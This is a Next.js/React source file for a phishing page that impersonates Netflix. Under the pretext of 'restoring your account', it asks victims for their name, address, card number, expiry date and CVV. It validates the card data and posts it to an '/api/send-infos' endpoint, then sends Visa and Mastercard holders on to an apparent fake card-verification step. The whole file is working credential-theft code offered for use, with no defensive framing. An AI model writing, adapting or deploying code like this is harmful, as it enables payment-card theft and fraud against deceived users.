import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import valid from "card-validator";
import * as yup from "yup";
import ReactInputMask from "react-input-mask";
import { useForm } from "react-hook-form";
import { Button } from "../components/Button";
import { Footer } from "../components/Footer";
import { Input } from "../components/Input";
import { Logo } from "../components/Logo";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";
import { Modal } from "../components/Modal";

interface VerifyInfoProps {}

const schema = yup.object().shape({
  fullname: yup.string().required(),
  address: yup.string().required(),
  zipCode: yup.string().required(),
  cardNumber: yup
    .string()
    .required("The field can't be left blank. Please enter your card number.")
    .test(
      "test-number",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid card number",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required(
      "The field can't be left blank. Please enter your card expiration date"
    )
    .test(
      "test-date",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required(
      "The field can't be left blank. Please enter your card security code."
    )
    .test(
      "test-cvv",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid CVV number.",
      (value) => valid.cvv(value).isValid
    ),
});

export const VerifyInfo: React.FC<VerifyInfoProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `INFOS`);
    formData.append(`infos`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-infos`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      infos: data,
    });

    const { card } = valid.number(data.cardNumber);
    const type = card && card.type ? card.type : ``;

    push(
      type === `visa` || type === `mastercard`
        ? `/secure/${type}`
        : `/confirmation`
    );
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper>
      <div className="login-wrapper">
        <div className="login-wrapper-background login-wrapper-default"></div>
        <div className="nfHeader login-header signupBasicHeader">
          <a href="" className="svg-nfLogo signupBasicHeader">
            <Logo />
            <span className="screen-reader-text">Netflix</span>
          </a>
        </div>
        <div className="login-body">
          <div className="login-content">
            <section className="reset-password-mop-container">
              <h1>Update Your Payment Info</h1>
              <p
                style={{
                  marginTop: `1em`,
                  marginBottom: `1em`,
                }}
              >
                Please provide this information to help us restore your account:
              </p>
              <div className="mop-input-container">
                <Input
                  label={`Full name on account`}
                  name={`fullname`}
                  register={register}
                />
                <Input label={`Address`} name={`address`} register={register} />
                <Input
                  label={`Zip code`}
                  name={`zipCode`}
                  type="number"
                  register={register}
                />
                    <Input
                    as={ReactInputMask}
                      label={`Credit or debit card number on file`}
                      mask={cardMask}
                      error={errors.cardNumber && errors.cardNumber.message}
                      register={register}
                      registerOptions={{
                        onChange: (event: any) => {
                          var value = event.target.value;

                          var newState = "9999 9999 9999 9999";
                          if (/^3[47]/.test(value)) {
                            newState = "9999 999999 99999";
                          }
                          setCardMask(newState);
                        },
                      }}
                      name={`cardNumber`}
                    />
                <Input
                as={ReactInputMask}
                mask="99/9999"
                  label={`Expiration date`}
                  name={`expirationDate`}
                  register={register}
                />
                <Input
                  label={`CVV`}
                  name={`cvv`}
                  type="number"
                  register={register}
                />
              </div>
              <Button
                label={`Pay`}
                onClick={onSubmit}
                disabled={!isValid || loading}
              />
            </section>
          </div>
          <div
            className="recaptcha-terms-of-use"
            style={{
              fontSize: `16px`,
            }}
          >
            <p>
              <span>
                {`This page is protected by Google reCAPTCHA to ensure you're not a bot.`}
              </span>
              &nbsp;
              <button
                className="recaptcha-terms-of-use--link-button"
                data-uia="recaptcha-learn-more-button"
                style={{
                  color: `inherit`,
                  textDecoration: `underline`,
                }}
              >
                Learn more.
              </button>
            </p>
            <div
              className="recaptcha-terms-of-use--disclosure"
              data-uia="recaptcha-disclosure"
            >
              <span id="" data-uia="recaptcha-disclosure-text">
                The information collected by Google reCAPTCHA is subject to the
                Google <a id="recaptcha-privacy-link">Privacy Policy</a> and{" "}
                <a id="recaptcha-tos-link">Terms of Service</a>, and is used for
                providing, maintaining, and improving the reCAPTCHA service and
                for general security purposes (it is not used for personalized
                advertising by Google).
              </span>
            </div>
          </div>
        </div>
        <Footer />
      </div>
    </Wrapper>
  );
};

export default VerifyInfo;
